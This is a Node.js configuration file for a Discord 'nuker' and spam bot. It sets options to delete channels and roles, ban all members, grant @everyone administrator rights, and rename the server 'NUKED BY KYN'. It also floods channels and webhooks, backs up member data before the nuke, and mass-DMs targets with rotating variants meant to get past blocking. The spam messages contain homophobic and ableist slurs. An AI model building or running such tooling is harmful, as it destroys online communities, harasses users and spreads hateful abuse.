require('dotenv').config();

module.exports = {
    general: {
        commandPrefix: '!',
        uptimePort: 3000,
        selfPingInterval: 300000,
        reconnectInterval: 60000,
        maxOperationTime: 1800000,
        // NEW: Fake activity (no code changes needed, bots already support presence)
        fakeActivity: {
            enabled: true,
            name: 'kyns dihh', // Status text
            type: 'WATCHING'    // PLAYING, WATCHING, etc.
        }
    },

    nuker: {
        token: process.env.TOKEN_NUKER,
        allowedUserIds: ['1284886248330231891', '1330130004931121224', '123'],
        whitelistedServerIds: ['1366020454795579496', '123'],
        // NEW: Auto-DM banned members (uses existing ban system)
        dmAfterBan: {
            enabled: true,
            message: "LMAO YOU GOT BANNED BY KYN! Server owned by GoldSociety. https://discord.gg/zxstXnd4"
        },
        // NEW: Backup nuke (saves server data before nuking)
        backupNuke: {
            enabled: true,
            saveTo: "./nuke_backups/" // Saves roles/channels/members as JSON
        },
        // NEW: Give @everyone admin (uses existing role system)
        giveEveryoneAdmin: true,
        // NEW: Leave quietly (skips spam if enabled)
        leaveQuietly: false, // No spam, just destruction + exit
        serverIcon: 'https://cdn.discordapp.com/avatars/1284886248330231891/d483984f4119be0f7ad1a7b892bf0d37.png',
        serverName: 'NUKED BY KYN🤡',
        channelNames: [
            'Nuked-By-Kyn-☠️💣',
            'Kyn-Own-This-Server-😹💤'
        ],
        channelCount: 10,
        spammedMessages: [
            '# @everyone GET NUKED BY KYN! 🐵 https://discord.gg/zxstXnd4',
            '# @here KYN OWNS YOU ALL NEWGENS! https://tenor.com/view/meme-down-syndrome-funny-tongue-action-tongue-out-meme-gif-572114404054760484',
            '# @everyone LOL THIS SERVER GOT DESTROYED 😹 https://cdn.discordapp.com/attachments/907080818562854954/1217174300650508448/attachment.gif?ex=68049127&is=68033fa7&hm=aaeea557f62d47bba1de31e232b160ffbdc1a9184ef8d251752959c683744782&'
        ],
        spamRounds: 100,
        timing: {
            channelCreateDelay: 10,
            channelDeleteDelay: 10,
            roleCreateDelay: 20,
            roleDeleteDelay: 20,
            banDelay: 100,
            messageDeleteDelay: 20,
            webhookCreateDelay: 20,
            serverEditDelay: 300,
            spamRoundDelay: 20,
            initialOperationDelay: 500
        },
        behavior: {
            createChannels: true,
            deleteChannels: true,
            banMembers: true,
            spamMessages: true,
            createWebhooks: true,
            editServerInfo: true,
            createRoles: true,
            deleteRoles: true,
            leaveServerAfterNuke: false
        },
        webhooks: {
            createCount: 2,
            names: ["NUKED BY KYN", "GET WRECKED BY GOLDSOCIETY"],
            messages: ["# NUKEDDDDDDDD JOIN https://discord.gg/zxstXnd4", "# KYN OWNS YOU"]
        },
        roles: {
            createCount: 10,
            names: ["NUKED BY KYN", "GET BETTER NEWGENS"],
            colors: ["#FF0000", "#000000"],
            hoist: true,
            mentionable: true
        }
    },

    spammer: {
        // NEW: Multi-token auto-switch (uses existing token system)
        tokens: [process.env.TOKEN_SPAMMER, process.env.TOKEN_SPAMMER_2], // Add more as backup
        authorizedIds: ['1284886248330231891', '13', '13'],
        whitelistedIds: ['1284886248330231891', '12'],
        defaultSpamMessage: "# YOU'RE BEING SPAMMED BY KYN FAGT! GET LOST BOZO! https://cdn.discordapp.com/attachments/1243645226091020328/1320136219585155114/d68845f804446649d52eb4085678eb3c.gif",
        spamDelay: 700,
        dm: {
            maxAttempts: 100,
            cooldown: 30000,
            typingDuration: 2000,
            deleteAfter: 60000
        },
        timing: {
            initialDelay: 2000,
            betweenMessages: 500,
            betweenTargets: 1000,
            typingDelay: 1500
        },
        behavior: {
            sendTyping: true,
            autoRestart: true,
            randomizeDelays: true,
            deleteMessages: false,
            mentionUser: true
        },
        bypass: {
            rotateMessages: true,
            messageVariants: [
                "# KYN OWNS YOU FAGTS {user}",
                "# GET SPAMMED BY KYN {user}",
                "# YOU CAN'T BLOCK ME {user}"
            ],
            addRandomText: true,
            useEmbeds: true
        }
    },

    safety: {
        maxOperationTime: 1800000,
        rateLimitProtection: true,
        emergencyStopCommand: '!abort',
        adminOverrideIds: ['1284886248330231891'],
        maxChannelsToCreate: 30,
        maxWebhooksToCreate: 50
    }
};